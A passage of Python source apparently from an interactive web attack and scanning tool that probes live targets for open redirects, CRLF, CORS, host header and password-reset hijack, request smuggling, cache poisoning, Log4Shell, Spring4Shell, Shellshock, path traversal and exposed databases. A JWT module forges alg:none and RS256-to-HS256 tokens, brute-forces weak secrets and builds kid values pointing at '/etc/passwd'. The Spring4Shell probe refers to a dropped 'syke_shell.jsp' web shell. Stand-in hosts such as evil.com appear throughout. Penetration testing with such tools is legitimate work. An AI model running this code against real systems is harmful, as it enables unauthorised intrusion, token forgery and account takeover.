                if r:
                    loc = r.headers.get("Location","")
                    if ("evil.com" in loc or
                            loc.startswith("javascript:") or
                            "attacker" in loc):
                        results.append({"url":f"{base}/?{param}={payload}",
                                        "param": param, "payload": payload,
                                        "location": loc})
                        _vuln(f"OPEN REDIRECT: {param}={payload[:40]}  "
                              f"→ {loc[:60]}")
                        _add_finding(
                            "HIGH","Open Redirect",f"{base}/?{param}=",
                            f"Redirects to: {loc}",f"Payload: {payload[:60]}",
                            "Whitelist allowed redirect destinations.","Redirect"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        _found_box("OPEN REDIRECT", base,
                   "\n".join(r['location'][:60] for r in results[:5]), found=True)
    else:
        _clean("No open redirect detected")
        _found_box("OPEN REDIRECT", base, "No open redirect detected", found=False)

    _result_box("OPEN REDIRECT",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No open redirect detected{RST}"
    ])
    _pause()
    return results

def open_redirect_probe(sess, base, timeout=None):
    if timeout is None:
        timeout = TIMEOUT
    results = []
    for param in ["url","redirect","next","return","goto","dest"]:
        for payload in OPEN_REDIRECT_PAYLOADS[:5]:
            try:
                r = sess.get(f"{base}/?{param}={quote(payload)}",
                             timeout=timeout, verify=VERIFY_SSL,
                             allow_redirects=False)
                if r and "evil.com" in r.headers.get("Location",""):
                    results.append({"url": f"{base}/?{param}={payload}",
                                    "param": param, "payload": payload,
                                    "type": "open_redirect"})
                    break
            except Exception:
                pass
    return results


                                                                                 
                        
                                                                                 

def crlf_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"CRLF Injection Scanner → {base}")
    results = []
    params  = ["q","search","page","next","url","redirect","name"]

    for param in params:
        for payload in CRLF_PAYLOADS:
            try:
                r = _get(f"{base}/?{param}={payload}", allow_redirects=False)
                if r:
                    sc = r.headers.get("Set-Cookie","")
                    if "injected=value" in sc or "crlf=injection" in sc:
                        results.append({"url": f"{base}/?{param}={payload}",
                                        "param": param, "payload": payload,
                                        "set_cookie": sc})
                        _vuln(f"CRLF: {param}={payload[:40]}  "
                              f"Set-Cookie injected")
                        _add_finding(
                            "HIGH","CRLF Injection",f"{base}/?{param}=",
                            "Injected Set-Cookie header in response",
                            f"Payload: {payload[:60]}",
                            "Strip newline chars from all headers.","CRLF"
                        )
                        break
            except Exception:
                pass
            _jitter()

    if results:
        _found_box("CRLF INJECTION", base,
                   "\n".join(r['payload'][:50] for r in results[:5]), found=True)
    else:
        _clean("No CRLF injection detected")
        _found_box("CRLF INJECTION", base,
                   "No CRLF injection detected", found=False)

    _result_box("CRLF SCAN",[
        f"{RED}Vulnerabilities: {len(results)}{RST}" if results
        else f"{GRN}No CRLF detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                               
                                                                                 

def cors_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"CORS Scanner → {base}")
    results = []

    for origin in CORS_ORIGINS_TEST:
        try:
            r = _get(base + "/", headers={"Origin": origin},
                     allow_redirects=True)
            if r:
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")
                if acao == "*":
                    results.append({"origin": origin, "acao": acao, "acac": acac,
                                    "severity": "HIGH", "type": "wildcard"})
                    _vuln(f"CORS wildcard: ACAO=*")
                    _add_finding(
                        "HIGH","CORS Wildcard",base,
                        "Access-Control-Allow-Origin: *",
                        "All origins permitted",
                        "Restrict CORS to trusted origins.","CORS"
                    )
                elif acao == origin and acac.lower() == "true":
                    results.append({"origin": origin, "acao": acao, "acac": acac,
                                    "severity": "HIGH",
                                    "type": "reflected_with_credentials"})
                    _vuln(f"CORS reflected with credentials: {origin}")
                    _add_finding(
                        "HIGH","CORS Reflected with Credentials",base,
                        f"ACAO reflects attacker origin + credentials allowed",
                        f"Origin: {origin}",
                        "Validate Origin header strictly.","CORS"
                    )
                elif acao == "null" and acac.lower() == "true":
                    results.append({"origin": origin, "acao": "null", "acac": acac,
                                    "severity": "HIGH", "type": "null_origin"})
                    _vuln(f"CORS null origin with credentials")
        except Exception:
            pass

    if results:
        _found_box("CORS MISCONFIGURATION", base,
                   "\n".join(f"[{r['type']}] {r['acao']}"
                             for r in results[:5]), found=True)
    else:
        _clean("No CORS misconfiguration detected")
        _found_box("CORS", base, "No CORS misconfiguration detected", found=False)

    _result_box("CORS SCAN",[
        f"{RED}Issues: {len(results)}{RST}" if results
        else f"{GRN}No CORS issues detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                    
                                                                                 

def jwt_attack():
    _banner()
    _menu_box("JWT ATTACK MODULE",[
        "[1] Decode + inspect JWT",
        "[2] Alg:none bypass",
        "[3] Secret brute-force (common list)",
        "[4] RS256 → HS256 confusion",
        "[5] kid parameter manipulation",
        "[0] Back",
    ])
    ch = _ask("jwt-option")

    if ch == "0":
        return

    token = _ask("paste-JWT-token")
    if not token:
        return

    parts = token.split(".")
    if len(parts) != 3:
        _err("Invalid JWT format (expected 3 parts)")
        _pause()
        return

    try:
        padding = "=" * (4 - len(parts[0]) % 4)
        hdr  = json.loads(base64.urlsafe_b64decode(parts[0] + padding))
        padding = "=" * (4 - len(parts[1]) % 4)
        body = json.loads(base64.urlsafe_b64decode(parts[1] + padding))
    except Exception as e:
        _err(f"Decode error: {e}")
        _pause()
        return

    if ch == "1":
        lines = [f"{GRN}Header:{RST}"]
        for k, v in hdr.items():
            lines.append(f"  {CYN}{k}{RST}: {v}")
        lines.append(f"{GRN}Payload:{RST}")
        for k, v in body.items():
            lines.append(f"  {CYN}{k}{RST}: {v}")
        _result_box("JWT DECODED", lines)

    elif ch == "2":
        for alg in JWT_ALG_NONE_VARIANTS:
            new_hdr = dict(hdr)
            new_hdr["alg"] = alg
            enc_hdr = base64.urlsafe_b64encode(
                json.dumps(new_hdr, separators=(",",":")).encode()
            ).rstrip(b"=").decode()
            enc_pay = parts[1]
            forged  = f"{enc_hdr}.{enc_pay}."
            _found(f"Forged token (alg={alg}): {forged[:60]}...")
        _result_box("ALG:NONE BYPASS",[
            f"{YLW}Try these forged tokens in Authorization header{RST}",
        ])

    elif ch == "3":
        common_secrets = [
            "secret","password","12345","jwt","token","key","admin",
            "test","1234567890","changeme","password123","qwerty",
            "secret123","mysecret","jwtkey","signingkey","myjwtsecret",
            "","null","undefined","0","1","true","false",
        ]
        cracked = None
        for sec in common_secrets:
            try:
                sig_check = base64.urlsafe_b64encode(
                    _hmac_mod.new(
                        sec.encode(),
                        f"{parts[0]}.{parts[1]}".encode(),
                        hashlib.sha256,
                    ).digest()
                ).decode().rstrip("=")
                if sig_check == parts[2]:
                    cracked = sec
                    break
            except Exception:
                pass
        if cracked is not None:
            _vuln(f"JWT secret CRACKED: {cracked!r}")
            _add_finding(
                "CRITICAL","JWT Weak Secret",parts[0],
                f"JWT signed with weak secret: {cracked!r}",
                f"HMAC-SHA256 secret: {cracked!r}",
                "Use a cryptographically random 256-bit secret.","JWT"
            )
            _result_box("JWT CRACKED",[
                f"{RED}Secret: {cracked!r}{RST}",
                f"{YLW}Forge any claims with this secret{RST}",
            ])
        else:
            _clean("Secret not in common list")
            _result_box("JWT BRUTE-FORCE",[
                f"{GRN}Secret not found in common list{RST}",
            ])

    elif ch == "4":
        _info("RS256 → HS256 confusion: sign with server's public key as HMAC secret")
        pub_key = _ask("path-to-server-public-key-or-paste")
        if pub_key and os.path.exists(pub_key):
            try:
                with open(pub_key, "rb") as f:
                    key_bytes = f.read()
                new_hdr         = dict(hdr)
                new_hdr["alg"]  = "HS256"
                enc_hdr = base64.urlsafe_b64encode(
                    json.dumps(new_hdr, separators=(",",":")).encode()
                ).rstrip(b"=").decode()
                msg = f"{enc_hdr}.{parts[1]}".encode()
                sig = base64.urlsafe_b64encode(
                    _hmac_mod.new(key_bytes, msg, hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                forged = f"{enc_hdr}.{parts[1]}.{sig}"
                _found(f"RS256→HS256 forged token: {forged[:60]}...")
                _result_box("RS256→HS256 CONFUSION",[
                    f"{RED}Forged token:{RST} {forged[:60]}...",
                ])
            except Exception as e:
                _err(f"Key error: {e}")
        else:
            _warn("Provide path to server public key file")

    elif ch == "5":
        kid_payloads = [
            ("../../dev/null",    "empty string secret"),
            ("/etc/passwd",       "file contents as secret"),
            ("' OR '1'='1'--",    "SQL injection in kid"),
            ("../../proc/self/cmdline", "process cmdline as secret"),
        ]
        lines = []
        for kid_val, note in kid_payloads:
            new_hdr       = dict(hdr)
            new_hdr["kid"] = kid_val
            enc_hdr = base64.urlsafe_b64encode(
                json.dumps(new_hdr, separators=(",",":")).encode()
            ).rstrip(b"=").decode()
            lines.append(f"{CYN}kid={kid_val[:40]}{RST} — {note}")
        _result_box("KID MANIPULATION VECTORS", lines)

    _pause()

def jwt_crack():
    jwt_attack()


                                                                                 
                     
                                                                                 

def oauth_audit(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return
    base = normalize_base(url)
    _info(f"OAuth/OIDC Audit → {base}")

    endpoints = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/authorize", "/oauth/token",
        "/oauth/callback", "/oauth/redirect",
        "/auth/callback", "/auth/oauth",
        "/api/auth/callback",
        "/auth/redirect",
    ]

    results = []
    for path in endpoints:
        try:
            r = _get(base + path)
            if r and r.status_code == 200:
                results.append({"path": base+path, "status": 200,
                                 "size": len(r.content)})
                _found(f"OAuth endpoint found: {path}")
                if "client_secret" in r.text.lower():
                    _vuln(f"client_secret exposed in {path}")
                    _add_finding(
                        "CRITICAL","OAuth Client Secret Exposed",base+path,
                        "client_secret visible in response",
                        f"Path: {path}",
                        "Never expose client_secret in public responses.","OAuth"
                    )
        except Exception:
            pass

    tests = [
        ("response_type=token",
         "Implicit flow enabled — token in URL fragment"),
        ("state=",
         "Check state param — CSRF protection bypass if missing"),
        ("redirect_uri=http://evil.com",
         "Open redirect_uri — token theft via unvalidated redirect"),
        ("code_challenge_method=plain",
         "PKCE plain method — weaker than S256"),
    ]

    lines = [f"{GRN}Endpoints found: {len(results)}{RST}"]
    for chk, note in tests:
        lines.append(f"{YLW}Check:{RST} {note}")

    _result_box("OAUTH AUDIT", lines)
    _pause()
    return results


                                                                                 
                               
                                                                                 

def host_header_injection(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Host Header Injection → {base}")
    results = []

    for evil_host in HOST_HEADER_PAYLOADS[:8]:
        try:
            r = _get(base + "/", headers={"Host": evil_host,
                                           "X-Forwarded-Host": evil_host})
            if r:
                body = r.text
                if ("evil.com" in body or evil_host in body or
                        r.headers.get("Location","").find("evil.com") != -1):
                    results.append({"host": evil_host, "reflected": True})
                    _vuln(f"Host header reflected: Host={evil_host}")
                    _add_finding(
                        "HIGH","Host Header Injection",base,
                        f"Host header value reflected in response",
                        f"Host: {evil_host}",
                        "Validate Host header against allowlist.","Headers"
                    )
        except Exception:
            pass

    password_reset_checks = [
        "/?action=resetpassword",
        "/forgot-password",
        "/reset-password",
        "/account/password/reset",
    ]
    for path in password_reset_checks:
        for evil_host in ["evil.com","attacker.com"]:
            try:
                r = _post(
                    base + path,
                    data={"email": "test@example.com"},
                    headers={"Host": evil_host,
                             "X-Forwarded-Host": evil_host},
                )
                if r and r.status_code in (200, 302):
                    _warn(f"Password reset + Host injection: {path}  "
                          f"Host={evil_host}")
                    results.append({"path": path, "host": evil_host,
                                    "type": "password_reset_hijack"})
                    _add_finding(
                        "HIGH","Password Reset Host Hijack",base+path,
                        f"Reset email may link to attacker domain",
                        f"Host: {evil_host}",
                        "Hardcode app domain in password reset URLs.","Auth"
                    )
            except Exception:
                pass

    if results:
        _found_box("HOST HEADER INJECTION", base,
                   "\n".join(str(r) for r in results[:5]), found=True)
    else:
        _clean("No host header injection detected")
        _found_box("HOST HEADER INJECTION", base,
                   "No host header injection detected", found=False)

    _result_box("HOST HEADER",[
        f"{RED}Issues: {len(results)}{RST}" if results
        else f"{GRN}No host header injection detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                                
                                                                                 

def http_smuggling_test(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    parsed  = urlparse(base)
    host    = parsed.hostname
    port    = parsed.port or (443 if base.startswith("https") else 80)
    _info(f"HTTP Request Smuggling → {base}")
    results = []

    clte_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    tecl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "12\r\n"
        "GPOST / HTTP/1.1\r\n"
        "0\r\n"
        "\r\n"
    )

    for name, payload in [("CL.TE", clte_payload), ("TE.CL", tecl_payload)]:
        try:
            raw  = payload.encode()
            use_ssl = base.startswith("https")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            s.send(raw)
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 8192:
                        break
            except Exception:
                pass
            s.close()
            resp_str = resp.decode("utf-8","ignore")
            if "HTTP/1.1 200" in resp_str or "HTTP/1.1 400" in resp_str:
                _warn(f"Smuggling probe {name}: server responded — manual analysis required")
                results.append({"type": name, "response_code":
                                 resp_str.split("\r\n")[0] if resp_str else "?"})
                _add_finding(
                    "HIGH",f"Potential HTTP Smuggling ({name})",base,
                    f"Server responded to {name} probe",
                    f"Probe type: {name}",
                    "Use HTTP/2. Normalize TE/CL handling in proxy.","Smuggling"
                )
        except Exception as e:
            _log("debug", f"Smuggling probe {name}: {e}")

    lines = [f"{YLW}Probes sent: CL.TE, TE.CL{RST}",
             f"{DIM}Manual analysis required to confirm{RST}"]
    if results:
        lines.insert(0, f"{RED}Potential responses detected: {len(results)}{RST}")
        _found_box("HTTP REQUEST SMUGGLING", base,
                   "\n".join(r['type'] for r in results), found=True)
    else:
        _found_box("HTTP REQUEST SMUGGLING", base,
                   "No definitive response — may still be vulnerable", found=False)

    _result_box("HTTP SMUGGLING", lines)
    _pause()
    return results


                                                                                 
                         
                                                                                 

def cache_poisoning_test(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Cache Poisoning → {base}")
    results = []
    probe   = f"syke-{_rand_str(8)}.evil.com"

    for hdr in CACHE_POISON_HEADERS:
        try:
            r = _get(base + "/", headers={hdr: probe})
            if r and probe in r.text:
                results.append({"header": hdr, "reflected": probe})
                _vuln(f"Cache poison candidate: {hdr}={probe} reflected")
                _add_finding(
                    "HIGH","Cache Poisoning Candidate",base,
                    f"Unkeyed header {hdr} reflected in response",
                    f"Header: {hdr}  Value: {probe}",
                    "Key all request headers that affect response.","Cache"
                )
            r2 = _get(base + "/")
            if r2 and probe in r2.text:
                results.append({"header": hdr, "poisoned_cache": True})
                _vuln(f"CACHE POISONED via {hdr}!")
        except Exception:
            pass

    if results:
        _found_box("CACHE POISONING", base,
                   "\n".join(r['header'] for r in results[:5]), found=True)
    else:
        _clean("No cache poisoning detected")
        _found_box("CACHE POISONING", base,
                   "No cache poisoning detected", found=False)

    _result_box("CACHE POISONING",[
        f"{RED}Candidates: {len(results)}{RST}" if results
        else f"{GRN}No cache poisoning detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                             
                                                                                 

def prototype_pollution_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Prototype Pollution → {base}")
    results = []

    for payload in PROTOTYPE_POLLUTION_PAYLOADS:
        try:
            r = _get(f"{base}/?{payload}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if "admin" in body or "true" in body or "privileged" in body:
                    results.append({"url": f"{base}/?{payload}",
                                    "payload": payload})
                    _vuln(f"Prototype pollution candidate: {payload}")
                    _add_finding(
                        "HIGH","Prototype Pollution Candidate",
                        f"{base}/?{payload}",
                        "Server-side prototype pollution possible",
                        f"Payload: {payload}",
                        "Sanitize object keys. Use Map instead of plain objects.","Proto"
                    )
        except Exception:
            pass

    if results:
        _found_box("PROTOTYPE POLLUTION", base,
                   "\n".join(r['payload'][:50] for r in results[:5]), found=True)
    else:
        _clean("No prototype pollution detected")
        _found_box("PROTOTYPE POLLUTION", base,
                   "No prototype pollution detected", found=False)

    _result_box("PROTOTYPE POLLUTION",[
        f"{RED}Candidates: {len(results)}{RST}" if results
        else f"{GRN}No prototype pollution detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                        
                                                                                 

def graphql_audit(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return {}
    base    = normalize_base(url)
    _info(f"GraphQL Audit → {base}")
    results = {}

    gql_paths = [
        "/graphql", "/graphiql", "/playground",
        "/api/graphql", "/gql", "/query",
        "/__graphql", "/v1/graphql", "/api/v1/graphql",
    ]

    found_endpoint = None
    for path in gql_paths:
        try:
            r = _post(
                base + path,
                json={"query": "{ __typename }"},
                headers={"Content-Type": "application/json"},
            )
            if r and r.status_code == 200 and "__typename" in r.text:
                found_endpoint = base + path
                _found(f"GraphQL endpoint: {path}")
                break
        except Exception:
            pass

    if not found_endpoint:
        _clean("No GraphQL endpoint found")
        _found_box("GRAPHQL", base, "No GraphQL endpoint found", found=False)
        _pause()
        return results

    results["endpoint"] = found_endpoint

    try:
        r = _post(
            found_endpoint,
            json={"query": GRAPHQL_PAYLOADS["introspection"]},
            headers={"Content-Type": "application/json"},
        )
        if r and "types" in r.text:
            results["introspection_enabled"] = True
            _vuln("GraphQL introspection enabled")
            _add_finding(
                "MEDIUM","GraphQL Introspection Enabled",found_endpoint,
                "Schema structure is publicly readable",
                "Introspection query returned type data",
                "Disable introspection in production.","GraphQL"
            )
            types_data = json.loads(r.text).get("data",{})
            type_names = []
            schema = types_data.get("__schema",{})
            for t in schema.get("types",[]):
                name = t.get("name","")
                if not name.startswith("__"):
                    type_names.append(name)
            results["types"] = type_names[:30]
            if type_names:
                _found(f"Types: {', '.join(type_names[:10])}")
    except Exception:
        pass

    try:
        r = _post(
            found_endpoint,
            json=GRAPHQL_PAYLOADS["batch"],
            headers={"Content-Type": "application/json"},
        )
        if r and r.status_code == 200:
            results["batching_enabled"] = True
            _warn("GraphQL batching enabled — rate limit bypass possible")
            _add_finding(
                "MEDIUM","GraphQL Batching",found_endpoint,
                "Batch queries bypass rate limiting",
                "Batch request returned 200 OK",
                "Implement per-query rate limiting.","GraphQL"
            )
    except Exception:
        pass

    lines = [
        f"{GRN}Endpoint:{RST} {found_endpoint}",
        f"{RED if results.get('introspection_enabled') else GRN}"
        f"Introspection: {'ENABLED' if results.get('introspection_enabled') else 'disabled'}{RST}",
        f"{YLW if results.get('batching_enabled') else GRN}"
        f"Batching: {'ENABLED' if results.get('batching_enabled') else 'disabled'}{RST}",
    ]
    if results.get("types"):
        lines.append(f"{CYN}Types:{RST} {', '.join(results['types'][:8])}")

    _result_box("GRAPHQL AUDIT", lines)
    _found_box("GRAPHQL ENDPOINT", base,
               f"Endpoint: {found_endpoint}", found=True)
    _pause()
    return results


                                                                                 
                             
                                                                                 

def log4shell_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base     = normalize_base(url)
    _info(f"Log4Shell (CVE-2021-44228) → {base}")
    callback = "evil.com"
    results  = []
    inject_headers = [
        "User-Agent", "X-Forwarded-For", "X-Api-Version",
        "X-Client-Id", "Referer", "X-Forwarded-Host",
        "Authorization", "Username", "Accept-Language",
        "X-Custom-Header",
    ]

    for payload in LOG4SHELL_PAYLOADS[:6]:
        for hdr in inject_headers:
            try:
                r = _get(base + "/", headers={hdr: payload})
                if r and r.status_code not in (400, 403):
                    _warn(f"Log4Shell payload sent via {hdr} — check JNDI callback")
                    results.append({"header": hdr, "payload": payload,
                                    "status": r.status_code})
            except Exception:
                pass

    lines = [
        f"{YLW}Payloads injected via {len(inject_headers)} headers{RST}",
        f"{DIM}Check your JNDI/DNS callback server for incoming connections{RST}",
        f"{DIM}Out-of-band detection required for confirmation{RST}",
    ]
    if results:
        lines.insert(0, f"{RED}Payloads sent — monitor callback: {callback}{RST}")
        _found_box("LOG4SHELL", base,
                   f"{len(results)} payloads delivered — check callback", found=True)
    else:
        _found_box("LOG4SHELL", base,
                   "Payloads sent — check callback server", found=False)

    _result_box("LOG4SHELL SCAN", lines)
    _pause()
    return results


                                                                                 
                                
                                                                                 

def spring4shell_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Spring4Shell (CVE-2022-22965) → {base}")
    results = []

    for payload in SPRING4SHELL_PAYLOADS:
        try:
            r = _get(base + "/?" + payload,
                     headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r:
                if r.status_code == 200 and "tomcat" in r.headers.get("Server","").lower():
                    _warn(f"Spring4Shell probe: Tomcat server responded to prefix payload")
                    results.append({"payload": payload[:60],
                                    "status": r.status_code})
                    _add_finding(
                        "CRITICAL","Spring4Shell Candidate",base,
                        "Server may be vulnerable to CVE-2022-22965",
                        payload[:60],
                        "Upgrade Spring Framework. Set Java security manager.","CVE"
                    )
        except Exception:
            pass

    lines = [
        f"{DIM}Java Tomcat deployment required for vulnerability{RST}",
        f"{DIM}Check for syke_shell.jsp in webroot after probe{RST}",
    ]
    if results:
        lines.insert(0, f"{RED}Potential Spring4Shell vectors: {len(results)}{RST}")
        _found_box("SPRING4SHELL", base,
                   f"{len(results)} potential vectors", found=True)
    else:
        _clean("No Spring4Shell indicators")
        _found_box("SPRING4SHELL", base,
                   "No Spring4Shell indicators", found=False)

    _result_box("SPRING4SHELL", lines)
    _pause()
    return results


                                                                                 
                              
                                                                                 

def shellshock_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Shellshock (CVE-2014-6271) → {base}")
    results = []
    cgi_paths = [
        "/cgi-bin/test.cgi", "/cgi-bin/status",
        "/cgi-bin/login.cgi", "/cgi-bin/admin.cgi",
        "/cgi-bin/test-cgi", "/cgi-bin/printenv",
    ]

    for path in cgi_paths:
        for payload in SHELLSHOCK_PAYLOADS[:4]:
            try:
                r = _get(
                    base + path,
                    headers={
                        "User-Agent":    payload,
                        "Referer":       payload,
                        "Cookie":        f"test={payload}",
                        "Custom-Header": payload,
                    }
                )
                if r and "vulnerable" in r.text.lower():
                    results.append({"path": path, "payload": payload})
                    _vuln(f"Shellshock CONFIRMED: {path}")
                    _add_finding(
                        "CRITICAL","Shellshock (CVE-2014-6271)",base+path,
                        "CGI script executes bash function definitions",
                        payload,
                        "Update bash. Disable CGI or restrict environment.","CVE"
                    )
            except Exception:
                pass

    if results:
        _found_box("SHELLSHOCK", base,
                   "\n".join(r['path'] for r in results[:5]), found=True)
    else:
        _clean("No Shellshock detected")
        _found_box("SHELLSHOCK", base, "No Shellshock detected", found=False)

    _result_box("SHELLSHOCK",[
        f"{RED}Vulnerable paths: {len(results)}{RST}" if results
        else f"{GRN}No Shellshock detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                               
                                                                                 

def iis_tilde_enum(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"IIS Tilde Enumeration → {base}")
    results = []

    for path in IIS_TILDE_PATHS:
        try:
            r = _get(base + path, allow_redirects=False)
            if r and r.status_code in (200, 301, 302, 404):
                if r.status_code != 404:
                    results.append({"path": base+path, "status": r.status_code})
                    _found(f"IIS short name candidate: {path}  [{r.status_code}]")
        except Exception:
            pass

    if results:
        _vuln(f"IIS tilde enumeration: {len(results)} short names found")
        _add_finding(
            "MEDIUM","IIS Tilde Enumeration",base,
            "IIS exposes 8.3 short file names via tilde notation",
            f"{len(results)} paths responded",
            "Disable short file names: fsutil 8dot3name set C: 1","IIS"
        )
        _found_box("IIS TILDE ENUM", base,
                   "\n".join(r['path'][:50] for r in results[:5]), found=True)
    else:
        _clean("No IIS tilde enumeration detected")
        _found_box("IIS TILDE ENUM", base,
                   "No IIS short names found", found=False)

    _result_box("IIS TILDE ENUM",[
        f"{RED}Short names found: {len(results)}{RST}" if results
        else f"{GRN}No IIS short names found{RST}"
    ])
    _pause()
    return results


                                                                                 
                               
                                                                                 

def nginx_alias_traversal(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Nginx Alias Traversal → {base}")
    results = []

    for path in NGINX_ALIAS_TRAVERSAL:
        try:
            r = _get(base + path)
            if r and r.status_code == 200:
                if LFI_PAT.search(r.text):
                    results.append({"path": base+path, "content": r.text[:100]})
                    _vuln(f"Nginx alias traversal: {path}")
                    _add_finding(
                        "CRITICAL","Nginx Alias Traversal",base+path,
                        "Misconfigured alias directive allows traversal",
                        path,
                        "Add trailing slash to alias directives.","Nginx"
                    )
        except Exception:
            pass

    if results:
        _found_box("NGINX ALIAS TRAVERSAL", base,
                   "\n".join(r['path'][:50] for r in results[:5]), found=True)
    else:
        _clean("No Nginx alias traversal detected")
        _found_box("NGINX ALIAS TRAVERSAL", base,
                   "No alias traversal detected", found=False)

    _result_box("NGINX TRAVERSAL",[
        f"{RED}Traversal paths: {len(results)}{RST}" if results
        else f"{GRN}No traversal detected{RST}"
    ])
    _pause()
    return results


                                                                                 
                                                             
                                                                                 

def database_exposure_scan(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    host    = urlparse(base).hostname
    _info(f"Database Exposure → {host}")
    results = []

    db_ports = {
        6379:  ("Redis",   b"*1\r\n$4\r\nINFO\r\n"),
        27017: ("MongoDB", b""),
        9200:  ("Elasticsearch", None),
        5432:  ("PostgreSQL", None),
        3306:  ("MySQL",   None),
        1521:  ("Oracle",  None),
        5984:  ("CouchDB", None),
        28017: ("MongoDB HTTP", None),
        9300:  ("ES Transport", None),
    }

    for port, (name, probe) in db_ports.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            result = s.connect_ex((host, port))
            if result == 0:
                banner = b""
                if probe:
                    s.send(probe)
                    try:
                        banner = s.recv(1024)
                    except Exception:
                        pass
                s.close()
                results.append({"service": name, "port": port,
                                 "banner": banner.decode("utf-8","ignore")[:80]})
                _vuln(f"{name} port open: {host}:{port}")
                _add_finding(
                    "HIGH",f"{name} Exposed",f"{host}:{port}",
                    f"{name} accessible without auth from internet",
                    f"Port {port} open",
                    f"Firewall port {port}. Require authentication.","Exposure"
                )
            else:
                s.close()
        except Exception:
            pass

    for path in ["/", "/_cluster/health", "/_cat/indices?v"]:
        try:
            r = _get(f"http://{host}:9200{path}")
            if r and r.status_code == 200 and "elasticsearch" in r.text.lower():
                results.append({"service": "Elasticsearch HTTP", "port": 9200,
                                 "path": path})
                _vuln(f"Elasticsearch HTTP API exposed: {path}")
                _add_finding(
                    "CRITICAL","Elasticsearch Exposed",f"http://{host}:9200",
                    "Elasticsearch HTTP API accessible without auth",
                    f"Path: {path}",
                    "Enable xpack.security. Firewall port 9200.","Exposure"
                )
        except Exception:
            pass

    if results:
        _found_box("DATABASE EXPOSURE", base,
                   "\n".join(f"[{r['service']}] :{r['port']}"
                             for r in results[:8]), found=True)
    else:
        _clean("No exposed databases found")
        _found_box("DATABASE EXPOSURE", base,
                   "No exposed database ports", found=False)

    _result_box("DATABASE EXPOSURE",[
        f"{RED}Exposed services: {len(results)}{RST}" if results
        else f"{GRN}No exposed database services{RST}"
    ])
    _pause()
    return results


                                                                                 
                        
                                                                                 

def race_condition_test(target):
    _banner()
    ok_, url, _ = check_host(target)
    if not ok_:
        _pause()
        return []
    base    = normalize_base(url)
    _info(f"Race Condition Tester → {base}")

    endpoint = _ask("endpoint-path (e.g. /api/redeem)")
    if not endpoint:
        return []

    n_threads = 20
    data_payload = _ask("POST-data (or blank)") or "code=TESTCODE&amount=100"
    results    = []
    responses  = []
    lock_local = threading.Lock()

    def _fire():
        try:
            r = _post(base + endpoint, data=data_payload)
            if r:
                with lock_local:
                    responses.append({
                        "status": r.status_code,
                        "body":   r.text[:200],
                    })
        except Exception:
            pass

    _info(f"Firing {n_threads} concurrent requests...")
    threads = [threading.Thread(target=_fire) for _ in range(n_threads)]
    start_gate = threading.Barrier(n_threads)

    def _synced():
        start_gate.wait()
        _fire()

    threads2 = [threading.Thread(target=_synced) for _ in range(n_threads)]
    for t in threads2:
        t.start()
    for t in threads2:
        t.join(timeout=15)

    success_codes = [r for r in responses if r["status"] in (200,201,202)]
    if len(success_codes) > 1:
        _vuln(f"Race condition: {len(success_codes)} successful responses")
        _add_finding(
            "HIGH","Race Condition",base+endpoint,
            f"{len(success_codes)} concurrent successes detected",
            f"{n_threads} concurrent requests",
            "Use database-level atomic operations and idempotency keys.","Race"
        )
        results = success_codes
        _found_box("RACE CONDITION", base,
                   f"{len(success_codes)} successful concurrent responses", found=True)
    else:
        _clean("No race condition detected in this test")
